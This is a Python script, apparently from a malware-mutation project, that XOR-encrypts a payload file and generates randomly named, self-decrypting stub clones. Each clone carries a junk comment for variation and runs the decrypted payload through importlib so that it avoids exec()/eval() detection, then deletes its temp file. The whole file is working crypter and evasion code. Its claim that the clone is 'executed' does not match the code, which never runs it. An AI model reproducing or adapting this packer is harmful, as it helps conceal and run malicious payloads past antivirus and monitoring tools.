"""
 • Reads payload.py
 • XOR-encodes it with a secret key stored only in xor_key.txt
 • Generates a self-decoding stub (clone) that loads the key at run-time
 • Saves the stub inside sandbox/, executes it, and logs the mutation
"""

import os, random, string, subprocess, textwrap
from datetime import datetime
from pathlib import Path

# ---------------- Paths ---------------------------
ROOT = Path(__file__).resolve().parent.parent       # project root
BOX  = ROOT / "sandbox"                             # replication cage
KEY_PATH = ROOT / "xor_key.txt"                     # secret key file
BOX.mkdir(exist_ok=True)

# -------------- Load XOR key -----------------
if not KEY_PATH.exists():
    raise RuntimeError("Missing xor_key.txt!")

key_bytes = KEY_PATH.read_text().strip().encode()

# ----------------XOR helper-------------------
def xor_data(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# ---------------- Encode the payload -------------------
payload_code = (ROOT / "payload.py").read_bytes()
cipher_bytes = xor_data(payload_code, key_bytes)    # encrypted payload

# ----------------- Build the decrypt-and-run stub -------------------
junk_comment = "# " + ''.join(random.choices(string.ascii_letters + ' ', k=30))

stub = textwrap.dedent(f"""
    {junk_comment}
    import tempfile, importlib.util, os, pathlib

    # Encrypted payload bytes (XOR-cipher text)
    cipher = {list(cipher_bytes)}

    # Location of the XOR key (run-time load, *not* embedded)
    KEY_PATH = pathlib.Path(__file__).resolve().parent.parent / "xor_key.txt"

    def xor_data(data, key):
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    # -------Fetch key at run-time -------
    if not KEY_PATH.exists():
        raise RuntimeError("XOR key missing at run-time!")
    key = KEY_PATH.read_text().strip().encode()

    # ------ Decrypt payload and write to temp file -----
    payload = xor_data(bytes(cipher), key).decode()
    tmp = tempfile.NamedTemporaryFile('w', delete=False, suffix='.py')
    tmp.write(payload)
    tmp.close()

    # ------- Import and execute the payload -------
    # Avoid using exec() or eval(), which are easier to catch
    spec = importlib.util.spec_from_file_location("pl", tmp.name)
    mod  = importlib.util.module_from_spec(spec)
    # Similar to running import, but at runtime and from a specific file.
    spec.loader.exec_module(mod)

    # -------- Clean up --------
    os.remove(tmp.name)
""")

# ----------------- Save stub to a random filename -------------------
clone_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".py"
clone_path = BOX / clone_name
clone_path.write_text(stub)

# ----------------- Log mutation-----------------------------
with open(BOX / "mutation.log", "a") as log:
    size = clone_path.stat().st_size
    log.write(f"[{datetime.now()}] Spawned {clone_name}  size={size}\n")

print(f" Spawned and executed clone → {clone_path}")